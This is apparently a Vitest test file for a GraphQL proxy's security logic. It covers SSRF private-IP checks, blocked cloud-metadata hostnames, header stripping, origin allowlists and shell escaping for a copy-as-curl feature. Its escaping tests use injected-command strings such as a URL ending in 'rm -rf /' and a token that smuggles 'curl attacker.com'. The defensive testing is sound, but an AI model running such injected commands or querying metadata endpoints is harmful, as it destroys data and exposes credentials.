import { describe, it, expect } from 'vitest'
import { playgroundConfig } from '../../playground.config'

/**
 * Tests for the GraphQL proxy security logic.
 *
 * These test the validation functions and configuration used by
 * server/api/graphql-proxy.post.ts without requiring a running
 * Nitro server. The actual proxy uses these same constants.
 */

// Replicate the isPrivateIP function from the proxy
function isPrivateIP(hostname: string): boolean {
  let normalized = hostname
  if (normalized.startsWith('::ffff:')) {
    normalized = normalized.slice(7)
  }

  const parts = normalized.split('.').map(Number)
  if (parts.length !== 4 || parts.some((n) => isNaN(n))) return false
  const [a, b] = parts
  if (a === 10) return true
  if (a === 127) return true
  if (a === 172 && b >= 16 && b <= 31) return true
  if (a === 192 && b === 168) return true
  if (a === 0) return true
  return false
}

// Replicate the sanitizeHeaders function from the proxy
function sanitizeHeaders(
  customHeaders: Record<string, string> | undefined,
  allowedHeaders: readonly string[]
): Record<string, string> {
  const sanitized: Record<string, string> = {
    'Content-Type': 'application/json'
  }

  if (!customHeaders || typeof customHeaders !== 'object') {
    return sanitized
  }

  for (const [key, value] of Object.entries(customHeaders)) {
    if (typeof key === 'string' && typeof value === 'string' && allowedHeaders.includes(key.toLowerCase())) {
      sanitized[key] = value
    }
  }

  return sanitized
}

describe('Proxy security: SSRF protection', () => {
  it('blocks 10.x.x.x private range', () => {
    expect(isPrivateIP('10.0.0.1')).toBe(true)
    expect(isPrivateIP('10.255.255.255')).toBe(true)
  })

  it('blocks 172.16-31.x.x private range', () => {
    expect(isPrivateIP('172.16.0.1')).toBe(true)
    expect(isPrivateIP('172.31.255.255')).toBe(true)
  })

  it('allows 172.15.x.x and 172.32.x.x (not private)', () => {
    expect(isPrivateIP('172.15.0.1')).toBe(false)
    expect(isPrivateIP('172.32.0.1')).toBe(false)
  })

  it('blocks 192.168.x.x private range', () => {
    expect(isPrivateIP('192.168.0.1')).toBe(true)
    expect(isPrivateIP('192.168.1.100')).toBe(true)
  })

  it('blocks 127.x.x.x loopback range', () => {
    expect(isPrivateIP('127.0.0.1')).toBe(true)
    expect(isPrivateIP('127.0.0.2')).toBe(true)
    expect(isPrivateIP('127.1.2.3')).toBe(true)
    expect(isPrivateIP('127.255.255.255')).toBe(true)
  })

  it('blocks 0.x.x.x range', () => {
    expect(isPrivateIP('0.0.0.0')).toBe(true)
    expect(isPrivateIP('0.1.2.3')).toBe(true)
  })

  it('blocks IPv6-mapped private addresses', () => {
    expect(isPrivateIP('::ffff:10.0.0.1')).toBe(true)
    expect(isPrivateIP('::ffff:127.0.0.1')).toBe(true)
    expect(isPrivateIP('::ffff:192.168.1.1')).toBe(true)
    expect(isPrivateIP('::ffff:172.16.0.1')).toBe(true)
  })

  it('allows IPv6-mapped public addresses', () => {
    expect(isPrivateIP('::ffff:8.8.8.8')).toBe(false)
    expect(isPrivateIP('::ffff:1.1.1.1')).toBe(false)
  })

  it('allows public IPs', () => {
    expect(isPrivateIP('8.8.8.8')).toBe(false)
    expect(isPrivateIP('1.1.1.1')).toBe(false)
    expect(isPrivateIP('203.0.113.1')).toBe(false)
  })

  it('returns false for non-IP hostnames', () => {
    expect(isPrivateIP('example.com')).toBe(false)
    expect(isPrivateIP('api.stripe.com')).toBe(false)
  })

  it('blocked hostnames list includes critical entries', () => {
    const blocked = playgroundConfig.proxy.blockedHostnames
    expect(blocked).toContain('localhost')
    expect(blocked).toContain('127.0.0.1')
    expect(blocked).toContain('0.0.0.0')
    expect(blocked).toContain('[::1]')
    expect(blocked).toContain('169.254.169.254') // AWS metadata
    expect(blocked).toContain('metadata.google.internal') // GCP metadata
  })
})

describe('Proxy security: Header sanitization', () => {
  const allowedHeaders = playgroundConfig.proxy.allowedHeaders

  it('always includes Content-Type', () => {
    const result = sanitizeHeaders(undefined, allowedHeaders)
    expect(result['Content-Type']).toBe('application/json')
  })

  it('passes through allowed headers', () => {
    const result = sanitizeHeaders(
      { Authorization: 'Bearer token123', 'Content-Type': 'application/json' },
      allowedHeaders
    )
    expect(result['Authorization']).toBe('Bearer token123')
  })

  it('strips disallowed headers', () => {
    const result = sanitizeHeaders(
      {
        Authorization: 'Bearer token123',
        Cookie: 'session=abc',
        'X-Forwarded-For': '1.2.3.4',
        Host: 'evil.com'
      },
      allowedHeaders
    )
    expect(result['Authorization']).toBe('Bearer token123')
    expect(result['Cookie']).toBeUndefined()
    expect(result['X-Forwarded-For']).toBeUndefined()
    expect(result['Host']).toBeUndefined()
  })

  it('handles null/undefined input', () => {
    expect(sanitizeHeaders(undefined, allowedHeaders)).toEqual({
      'Content-Type': 'application/json'
    })
  })

  it('is case-insensitive for header matching', () => {
    const result = sanitizeHeaders({ authorization: 'Bearer test' }, allowedHeaders)
    expect(result['authorization']).toBe('Bearer test')
  })
})

describe('Proxy security: Origin validation', () => {
  const allowedOrigins = playgroundConfig.proxy.allowedOrigins

  it('allows the production origins', () => {
    expect(allowedOrigins).toContain('https://playground.icjia.app')
    expect(allowedOrigins).toContain('https://icjia-graphql-playground.netlify.app')
  })

  it('does not include localhost origins in production config', () => {
    expect(allowedOrigins).not.toContain('http://localhost:3000')
    expect(allowedOrigins).not.toContain('http://localhost:3001')
  })

  it('only contains HTTPS origins', () => {
    for (const origin of allowedOrigins) {
      expect(origin).toMatch(/^https:\/\//)
    }
  })

  it('does not allow arbitrary origins', () => {
    expect(allowedOrigins).not.toContain('https://evil.com')
    expect(allowedOrigins).not.toContain('https://example.com')
  })

  it('does not include the old Netlify URL', () => {
    for (const origin of allowedOrigins) {
      expect(origin).not.toContain('graphql-playground-updated')
    }
  })
})

describe('Proxy security: Bearer token handling', () => {
  const allowedHeaders = playgroundConfig.proxy.allowedHeaders

  it('authorization header is in the allowed list', () => {
    expect(allowedHeaders).toContain('authorization')
  })

  it('forwards a valid Bearer token through sanitization', () => {
    const result = sanitizeHeaders(
      { Authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.test-payload.signature' },
      allowedHeaders
    )
    expect(result['Authorization']).toBe('Bearer eyJhbGciOiJIUzI1NiJ9.test-payload.signature')
  })

  it('forwards x-api-key through sanitization', () => {
    const result = sanitizeHeaders({ 'X-API-Key': 'sk-live-abc123' }, allowedHeaders)
    expect(result['X-API-Key']).toBe('sk-live-abc123')
  })

  it('strips cookie headers to prevent session hijacking via proxy', () => {
    const result = sanitizeHeaders(
      { Authorization: 'Bearer token', Cookie: 'session=abc123; auth=xyz' },
      allowedHeaders
    )
    expect(result['Authorization']).toBe('Bearer token')
    expect(result['Cookie']).toBeUndefined()
  })

  it('strips set-cookie to prevent injection', () => {
    const result = sanitizeHeaders({ 'Set-Cookie': 'malicious=true' }, allowedHeaders)
    expect(result['Set-Cookie']).toBeUndefined()
  })

  it('strips x-forwarded-for to prevent IP spoofing', () => {
    const result = sanitizeHeaders({ 'X-Forwarded-For': '1.2.3.4' }, allowedHeaders)
    expect(result['X-Forwarded-For']).toBeUndefined()
  })

  it('strips host header to prevent host injection', () => {
    const result = sanitizeHeaders({ Host: 'evil.com' }, allowedHeaders)
    expect(result['Host']).toBeUndefined()
  })

  it('rejects non-string header values', () => {
    const result = sanitizeHeaders({ Authorization: 123 as any, 'Content-Type': null as any }, allowedHeaders)
    // Only the default Content-Type should remain
    expect(result['Authorization']).toBeUndefined()
    expect(result['Content-Type']).toBe('application/json')
  })

  it('rejects non-string header keys passed as objects', () => {
    const result = sanitizeHeaders({ '': 'Bearer token' } as any, allowedHeaders)
    expect(result['']).toBeUndefined()
  })

  it('does not leak token when headers object is empty', () => {
    const result = sanitizeHeaders({}, allowedHeaders)
    expect(Object.keys(result)).toEqual(['Content-Type'])
  })

  it('production requires HTTPS so token is encrypted in transit to proxy', () => {
    const productionOrigin = playgroundConfig.proxy.allowedOrigins.find((o) => o.startsWith('https://'))
    expect(productionOrigin).toBeDefined()
    expect(productionOrigin).toMatch(/^https:\/\//)
  })

  it('production requires HTTPS endpoints so token is encrypted to target API', () => {
    // In production, only https: endpoints are allowed (http: is rejected)
    // Verify the proxy config enforces this by checking example endpoints
    for (const ep of playgroundConfig.exampleEndpoints) {
      expect(ep.url).toMatch(/^https:\/\//)
    }
  })
})

describe('Proxy security: DNS resolution SSRF defense', () => {
  it('isPrivateIP catches resolved private IPs from DNS', () => {
    // After DNS resolution, these resolved IPs should be blocked
    expect(isPrivateIP('127.0.0.1')).toBe(true)
    expect(isPrivateIP('10.0.0.1')).toBe(true)
    expect(isPrivateIP('192.168.1.1')).toBe(true)
    expect(isPrivateIP('172.16.0.1')).toBe(true)
  })

  it('isPrivateIP allows resolved public IPs', () => {
    expect(isPrivateIP('8.8.8.8')).toBe(false)
    expect(isPrivateIP('104.21.32.1')).toBe(false)
    expect(isPrivateIP('13.107.42.14')).toBe(false)
  })

  it('link-local 169.254.169.254 is in blocked hostnames', () => {
    const blocked = playgroundConfig.proxy.blockedHostnames
    expect(blocked).toContain('169.254.169.254')
  })
})

describe('Proxy security: Shell escape for CURL copy', () => {
  // Replicate the shellEscape function from ToolbarActions.vue
  function shellEscape(s: string): string {
    return s.replace(/'/g, "'\\''")
  }

  it('escapes single quotes in URLs', () => {
    const malicious = "https://evil.com/graphql'; rm -rf / #"
    const escaped = shellEscape(malicious)
    // The single quote should be replaced with the shell escape pattern
    // Verify the escape pattern is present (close-quote, backslash-quote, open-quote)
    expect(escaped).toContain("'\\''")
    // Original unescaped single quote should not appear as-is
    expect(escaped).not.toBe(malicious)
    // The escaped string has more characters than the original due to escaping
    expect(escaped.length).toBeGreaterThan(malicious.length)
  })

  it('leaves clean URLs unchanged', () => {
    const clean = 'https://api.example.com/graphql'
    expect(shellEscape(clean)).toBe(clean)
  })

  it('escapes single quotes in bearer tokens', () => {
    const malicious = "token'; curl attacker.com #"
    const escaped = shellEscape(malicious)
    // The single quote is properly escaped with the '\'' pattern
    expect(escaped).toContain("'\\''")
  })

  it('escapes single quotes in JSON body', () => {
    const json = JSON.stringify({ query: "{ user(name: \"O'Brien\") { id } }" })
    const escaped = shellEscape(json)
    // The single quote in O'Brien is escaped
    expect(escaped).toContain("'\\''")
    expect(escaped).not.toBe(json)
  })

  it('handles strings with no single quotes', () => {
    expect(shellEscape('hello world')).toBe('hello world')
  })

  it('handles strings with multiple single quotes', () => {
    expect(shellEscape("it's a test's case")).toBe("it'\\''s a test'\\''s case")
  })
})

describe('Proxy security: Redirect protection', () => {
  it('proxy config uses a 30s timeout to prevent slow-loris', () => {
    expect(playgroundConfig.proxy.requestTimeout).toBe(30_000)
  })

  it('max query length prevents resource exhaustion', () => {
    expect(playgroundConfig.proxy.maxQueryLength).toBe(100_000)
  })
})

describe('Proxy security: URL validation', () => {
  it('graphql path check would reject non-graphql paths', () => {
    const testUrl = new URL('https://example.com/api/data')
    expect(testUrl.pathname.includes('graphql')).toBe(false)
  })

  it('graphql path check would accept graphql paths', () => {
    const testUrl = new URL('https://example.com/graphql')
    expect(testUrl.pathname.includes('graphql')).toBe(true)
  })

  it('graphql path check accepts nested graphql paths', () => {
    const testUrl = new URL('https://example.com/api/graphql')
    expect(testUrl.pathname.includes('graphql')).toBe(true)
  })

  it('HTTPS enforcement would reject HTTP in production', () => {
    const testUrl = new URL('http://example.com/graphql')
    expect(testUrl.protocol).not.toBe('https:')
  })

  it('rejects queries exceeding max length', () => {
    const maxLen = playgroundConfig.proxy.maxQueryLength
    const longQuery = 'x'.repeat(maxLen + 1)
    expect(longQuery.length).toBeGreaterThan(maxLen)
  })

  it('accepts queries within max length', () => {
    const maxLen = playgroundConfig.proxy.maxQueryLength
    const normalQuery = '{ users { id name } }'
    expect(normalQuery.length).toBeLessThan(maxLen)
  })
})
